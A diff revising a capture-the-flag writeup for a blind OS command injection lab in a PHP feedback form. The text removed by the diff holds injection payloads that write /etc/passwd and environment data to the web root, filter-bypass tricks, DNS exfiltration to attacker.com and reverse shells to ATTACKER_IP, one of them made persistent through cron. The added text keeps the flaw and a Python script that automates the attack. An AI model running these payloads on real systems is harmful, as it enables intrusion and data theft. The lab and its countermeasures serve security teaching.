@@ -1,287 +1,63 @@
-# OS Command Injection with Time Delays - Lab Description
+# Blind OS Command Injection with Output Redirection - Writeup
 
-## Overview
+## Challenge Overview
 
-This laboratory presents a blind OS command injection vulnerability in a PHP web application. The application executes shell commands containing user-provided data without proper validation.
+This challenge presents a blind OS command injection vulnerability in a PHP web application. The objective is to confirm the vulnerability and then extract the content of the `/etc/passwd` file.
 
-## Application Architecture
-
-### Technologies Used
-- **Backend**: PHP 8.1 with Apache
-- **Frontend**: HTML5, TailwindCSS (dark theme)
-- **Containerization**: Docker with docker-compose
-- **Port**: 3206
-
-### Application Structure
-- **Home page** (`index.php`): TechCorp company presentation
-- **Feedback system** (`feedback.php`): Form vulnerable to command injection
-- **Administration panel** (`admin.php`): Monitoring interface
-
-## Vulnerability
+## Vulnerability Analysis
 
 ### Location
-The vulnerability is located in the `feedback.php` file at lines 15-17:
+The vulnerability is located in the `feedback.php` file:
 
 ```php
-$email_validation_cmd = "echo 'Validating email: " . $email . "'";
-$output = shell_exec($email_validation_cmd);
-```
-
-### Mechanism
-1. User submits a feedback form
-2. The `email` parameter is directly concatenated into a shell command
-3. The command is executed via `shell_exec()`
-4. No validation or escaping is performed
-
-### Vulnerability Type
-- **Blind OS Command Injection**: Command output is not returned in the response
-- **Time-based exploitation**: Exploitation is done via time delays
-
-## Exploitation
-
-### Objective
-Cause a 10-second delay to confirm execution of arbitrary commands.
-
-### Exploitation Payload
-```
-x||ping+-c+10+127.0.0.1||
-```
-
-### Payload Explanation
-- `x`: Dummy value for the first echo
-- `||`: Logical OR operator to execute the next command
-- `ping+-c+10+127.0.0.1`: Ping command with 10 packets to localhost
-- `||`: OR operator to continue execution
-
-### Other Possible Payloads
-```
-x||sleep+10||
-x||curl+-m+10+http://127.0.0.1:9999||
-x||nc+-w+10+127.0.0.1+80||
-```
-
-## Detection Methods
-
-### 1. Time-based Detection
-- Submit payloads with increasing delays
-- Observe response times
-- Confirm execution through delays
-
-### 2. Out-of-band Detection
-- Use commands that generate network traffic
-- Monitor network logs
-- Use external services (DNS, HTTP)
-
-### 3. Error-based Detection
-- Test commands that generate errors
-- Observe error messages in logs
-- Analyze error responses
-
-## Countermeasures
-
-### 1. Input Validation
-```php
-// Strict email validation
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    die("Invalid email");
-}
-```
-
-### 2. Character Escaping
-```php
-// Escape special characters
-$email = escapeshellarg($email);
-```
-
-### 3. Use Safe Alternatives
-```php
-// Use native PHP functions instead of shell_exec
-$email_parts = explode('@', $email);
-$domain = $email_parts[1] ?? '';
-```
-
-### 4. Whitelist
-```php
-// Allow only known domains
-$allowed_domains = ['example.com', 'company.com'];
-if (!in_array($domain, $allowed_domains)) {
-    die("Unauthorized domain");
-}
-```
-
-## Learning Scenarios
-
-### Beginner Level
-- Understand command injection concepts
-- Identify injection points
-- Test simple payloads
-
-### Intermediate Level
-- Exploit blind vulnerabilities
-- Use time-based techniques
-- Bypass security filters
-
-### Advanced Level
-- Develop custom payloads
-- Bypass WAF
-- Data exfiltration via OOB
-
-## Additional Resources
-
-- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
-- [PortSwigger OS Command Injection](https://portswigger.net/web-security/os-command-injection)
-- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
-
----
-
-# 🎯 COMPLETE WRITEUP - Detailed Solution
-
-## Step 1: Reconnaissance
-
-### 1.1 Application Analysis
-The application presents three main pages:
-- **Home page**: TechCorp presentation
-- **Feedback form**: Vulnerable entry point
-- **Administration panel**: Monitoring interface
-
-### 1.2 Vulnerability Identification
-By analyzing the source code of `feedback.php`, we identify the vulnerability:
-
-```php
-$email_validation_cmd = "echo 'Validating email: " . $email . "'";
-$output = shell_exec($email_validation_cmd);
+$output = shell_exec("/bin/sh -c \"$email\" 2>&1");
 ```
 
 The `$email` parameter is directly concatenated into a shell command without validation.
 
-## Step 2: Exploitation
+### Vulnerability Type
+- **Blind OS Command Injection**: Command output is not returned in the response
+- **Time-based exploitation**: Use of delays to confirm execution
 
-### 2.1 Basic Test
-Start by testing if injection works:
+## Exploitation
 
-**Test payload:**
-```
-test@example.com; whoami
-```
+### Step 1: Vulnerability Confirmation
 
-**Result:** No visible output (blind injection)
-
-### 2.2 Confirmation via Time-based
-Use a delay to confirm execution:
-
-**Confirmation payload:**
+**Test payload with delay:**
 ```
 test@example.com; sleep 5
 ```
 
-**Result:** 5-second delay observed
+**Result:** 5-second delay observed, confirming execution of arbitrary commands.
 
-### 2.3 Exploitation with Redirection
-Use output redirection to extract information:
+### Step 2: Directory Exploration
+
+**List directory contents:**
+```
+test@example.com; ls -la > /var/www/html/images/directory_contents.txt
+```
+
+**Access the file:**
+```
+http://localhost:3206/images/directory_contents.txt
+```
+
+### Step 3: Extraction of /etc/passwd Content
 
 **Payload to extract /etc/passwd:**
 ```
-test@example.com; cat /etc/passwd > /var/www/html/passwd.txt
+test@example.com; cat /etc/passwd > /var/www/html/images/passwd.txt
 ```
 
 **File access:**
 ```
-http://localhost:3206/passwd.txt
+http://localhost:3206/images/passwd.txt
 ```
 
-## Step 3: Data Exfiltration
+**Flag:** The content of `/etc/passwd` is the flag of this challenge. Once extracted and accessible via web browser, this constitutes the successful completion of the challenge.
 
-### 3.1 System File Extraction
-```bash
-# User list
-test@example.com; cat /etc/passwd > /var/www/html/users.txt
+## Automation Script
 
-# System information
-test@example.com; uname -a > /var/www/html/system.txt
-
-# Process list
-test@example.com; ps aux > /var/www/html/processes.txt
-
-# Environment variables
-test@example.com; env > /var/www/html/environment.txt
-```
-
-### 3.2 File System Exploration
-```bash
-# List current directory
-test@example.com; ls -la > /var/www/html/current_dir.txt
-
-# Explore /etc
-test@example.com; ls -la /etc > /var/www/html/etc_contents.txt
-
-# Search for sensitive files
-test@example.com; find / -name "*.conf" -type f 2>/dev/null > /var/www/html/config_files.txt
-```
-
-## Step 4: Advanced Techniques
-
-### 4.1 Filter Bypass
-If filters are in place, use bypass techniques:
-
-```bash
-# URL encoding
-test@example.com; cat /etc/passwd | base64 > /var/www/html/passwd_b64.txt
-
-# Variable usage
-test@example.com; a=cat; b=/etc/passwd; $a $b > /var/www/html/passwd_var.txt
-
-# Concatenation
-test@example.com; c"a"t /etc/passwd > /var/www/html/passwd_concat.txt
-```
-
-### 4.2 DNS Exfiltration
-```bash
-# Use nslookup to exfiltrate data
-test@example.com; nslookup $(cat /etc/passwd | head -1 | base64).attacker.com
-```
-
-### 4.3 Reverse Shell (Optional)
-```bash
-# Create a reverse shell
-test@example.com; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
-```
-
-## Step 5: Post-Exploitation
-
-### 5.1 Privilege Escalation
-```bash
-# Check sudo permissions
-test@example.com; sudo -l > /var/www/html/sudo_perms.txt
-
-# Search for SUID files
-test@example.com; find / -perm -4000 2>/dev/null > /var/www/html/suid_files.txt
-```
-
-### 5.2 Persistence
-```bash
-# Create a cron job
-test@example.com; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
-```
-
-## Step 6: Cleanup and Documentation
-
-### 6.1 Evidence File Removal
-```bash
-# Remove created files
-test@example.com; rm -f /var/www/html/*.txt
-```
-
-### 6.2 Exploit Documentation
-Document all used payloads and obtained results for future reference.
-
-## 🔧 Recommended Tools
-
-### Testing Tools
-- **Burp Suite**: Request interception and modification
-- **OWASP ZAP**: Vulnerability scanner
-- **Nmap**: Port and service discovery
-
-### Automation Scripts
 ```python
 import requests
 import time
@@ -299,82 +75,31 @@ def test_injection(payload):
     
     return end_time - start_time
 
-# Delay test
+# Delay test to confirm vulnerability
 delay = test_injection('test@example.com; sleep 5')
 print(f"Observed delay: {delay} seconds")
+
+# List directory contents
+test_injection('test@example.com; ls -la > /var/www/html/images/directory_contents.txt')
+print("Directory contents extracted to directory_contents.txt")
+
+# Extraction of /etc/passwd (the flag)
+extraction_payload = 'test@example.com; cat /etc/passwd > /var/www/html/images/passwd.txt'
+test_injection(extraction_payload)
+print("Flag (/etc/passwd content) extracted to passwd.txt")
 ```
 
-## 🛡️ Recommended Countermeasures
-
-### 1. Strict Validation
-```php
-// Strict email validation
-if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-    die("Invalid email");
-}
-
-// Domain whitelist
-$allowed_domains = ['example.com', 'company.com'];
-$domain = substr(strrchr($email, "@"), 1);
-if (!in_array($domain, $allowed_domains)) {
-    die("Unauthorized domain");
-}
-```
-
-### 2. Proper Escaping
-```php
-// Use escapeshellarg for all inputs
-$email = escapeshellarg($email);
-$name = escapeshellarg($name);
-$message = escapeshellarg($message);
-```
-
-### 3. Safe Alternatives
-```php
-// Use native PHP functions
-$email_parts = explode('@', $email);
-$domain = $email_parts[1] ?? '';
-
-// Domain validation
-if (!checkdnsrr($domain, 'MX')) {
-    die("Invalid domain");
-}
-```
-
-### 4. Monitoring and Logging
-```php
-// Log all injection attempts
-$suspicious_patterns = [';', '|', '&', '`', '$('];
-foreach ($suspicious_patterns as $pattern) {
-    if (strpos($email, $pattern) !== false) {
-        error_log("Injection attempt detected: " . $email);
-        die("Unauthorized character detected");
-    }
-}
-```
-
-## 📊 Security Metrics
-
-### Response Time
-- **Normal**: < 1 second
-- **Injection detected**: > 5 seconds
-- **Successful exploitation**: Delay corresponding to payload
+## Results Obtained
 
 ### Created Files
-- **passwd.txt**: User list
-- **system.txt**: System information
-- **processes.txt**: Running processes
-- **environment.txt**: Environment variables
+- **directory_contents.txt**: Contents of the current directory
+- **passwd.txt**: Content of `/etc/passwd` accessible via `http://localhost:3206/images/passwd.txt` (this is the flag)
 
-## 🎯 Learning Objectives Achieved
-
-✅ **Understanding of blind injections**
-✅ **Mastery of redirection techniques**
-✅ **Time-based exploitation**
-✅ **Data exfiltration**
-✅ **Filter bypass**
-✅ **Post-exploitation**
+### Security Metrics
+- **Normal response time**: < 1 second
+- **Injection detected**: > 5 seconds with `sleep`
+- **Successful exploitation**: Content of `/etc/passwd` accessible via redirection
 
 ---
 
-*This writeup demonstrates a complete exploitation of the blind OS command injection vulnerability with output redirection.* 
+*This writeup demonstrates the exploitation of the blind OS command injection vulnerability to extract the content of /etc/passwd via output redirection.* 
